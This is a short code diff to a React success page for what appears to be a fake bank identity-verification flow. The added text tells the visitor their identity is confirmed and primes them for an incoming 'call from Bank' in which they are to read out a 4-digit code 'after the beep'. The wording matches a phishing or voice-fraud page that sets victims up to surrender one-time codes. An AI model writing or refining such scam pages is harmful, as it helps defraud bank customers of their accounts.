@@ -10,12 +10,14 @@ export default function SuccessPage() {
         <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4">
           You're Almost Done!
         </h1>
-        <p className="text-gray-600 mb-2">
-          We've confirmed your identity.
-        </p>
+        <p className="text-gray-600 mb-2">Identity confirmed.</p>
         <p className="text-gray-600">
-          Your monthly bill will now be updated on your Direct Debit in{" "}
-          <span className="font-semibold text-gray-800">24 hours</span>.
+          Your Direct Debit will be updated within 24 hours. You will receive a
+          call from Bank—
+          <p className="text-gray-600">
+            please get the 4-digit code from your agent and enter it during the
+            call after the beep.
+          </p>
         </p>
         {/* <button
           onClick={() => (window.location.href = "/")}
